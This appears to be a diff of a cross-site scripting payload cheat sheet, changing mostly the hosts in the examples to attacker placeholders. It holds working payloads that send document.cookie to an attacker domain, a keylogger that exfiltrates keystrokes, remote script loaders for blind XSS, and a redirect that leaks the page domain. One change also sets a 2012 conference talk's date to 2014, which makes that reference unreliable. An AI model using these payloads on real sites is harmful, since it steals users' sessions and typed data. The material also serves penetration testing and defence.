@@ -84,7 +84,7 @@ fclose($fp);
 
 ```html
 <script>
-  fetch('https://<SESSION>.burpcollaborator.net', {
+  fetch('https://[ATTACKER.DOMAIN.TLD]', {
   method: 'POST',
   mode: 'no-cors',
   body: document.cookie
@@ -108,7 +108,7 @@ document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue
 Another way to collect sensitive data is to set a javascript keylogger.
 
 ```javascript
-<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
+<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>
 ```
 
 ### Other Ways
@@ -152,7 +152,7 @@ Example:
 <script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
 ```
 
-References:
+Additional reading:
 
 - [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domain)
 - [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=KHwVjzWei1c)
@@ -401,7 +401,7 @@ SVG 1.x (xlink:href)
 
 ```xml
 <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <image xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg" height="200" width="200"/>
+  <image xlink:href="http://10.10.10.10:9999/red_lightning_xss_full.svg" height="200" width="200"/>
 </svg>
 ```
 
@@ -411,7 +411,7 @@ SVG 1.x (xlink:href)
 
 ```xml
 <svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
-  <use xlink:href="http://127.0.0.1:9999/red_lightning_xss_full.svg#lightning"/>
+  <use xlink:href="http://10.10.10.10:9999/red_lightning_xss_full.svg#lightning"/>
 </svg>
 ```
 
@@ -470,7 +470,7 @@ div  {
 
 <script>
 document.getElementById('btn').onclick = function(e){
-    window.poc = window.open('http://www.redacted.com/#login');
+    window.poc = window.open('http://10.10.10.10/#login');
     setTimeout(function(){
         window.poc.postMessage(
             {
@@ -499,9 +499,9 @@ You can set up an alternative version
 - Hosted on [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com/)
 
 ```xml
-"><script src="https://js.rip/<custom.name>"></script>
-"><script src=//<custom.subdomain>.xss.ht></script>
-<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
+"><script src="https://js.rip/[ATTACKER.DOMAIN.TLD]"></script>
+"><script src=//[ATTACKER.DOMAIN.TLD]></script>
+<script>$.getScript("//[ATTACKER.DOMAIN.TLD]")</script>
 ```
 
 ### Other Blind XSS tools
@@ -530,7 +530,7 @@ You can use a [data grabber for XSS](#data-grabber) and a one-line HTTP server t
 Eg. payload
 
 ```html
-<script>document.location='http://10.10.14.30:8080/XSS/grabber.php?c='+document.domain</script>
+<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>
 ```
 
 Eg. one-line HTTP server:
@@ -578,7 +578,7 @@ Use browsers quirks to recreate some HTML tags.
 - [Frans Rosén on how he got Bug Bounty for Mega.co.nz XSS - Frans Rosén - February 14, 2013](https://web.archive.org/web/20231004090825/https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/)
 - [Google XSS Turkey - Frans Rosén - June 6, 2015](https://web.archive.org/web/20231004100309/https://labs.detectify.com/2015/06/06/google-xss-turkey/)
 - [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf) - Marin Moulinier - March 9, 2017](https://web.archive.org/web/20260304011652/https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff)
-- [Killing a bounty program, Twice - Itzhak (Zuk) Avraham and Nir Goldshlager - May 2012](https://web.archive.org/web/20140926052901/http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
+- [Killing a bounty program, Twice - Itzhak (Zuk) Avraham and Nir Goldshlager - September 26, 2014](https://web.archive.org/web/20140926052901/http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
 - [Mutation XSS in Google Search -  Tomasz Andrzej Nidecki - April 10, 2019](https://web.archive.org/web/20260305093221/https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
 - [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang - September 26, 2013](https://web.archive.org/web/20250901044759/https://cure53.de/fp170.pdf)
 - [postMessage XSS on a million sites - Mathias Karlsson - December 15, 2016](https://web.archive.org/web/20231004103135/https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
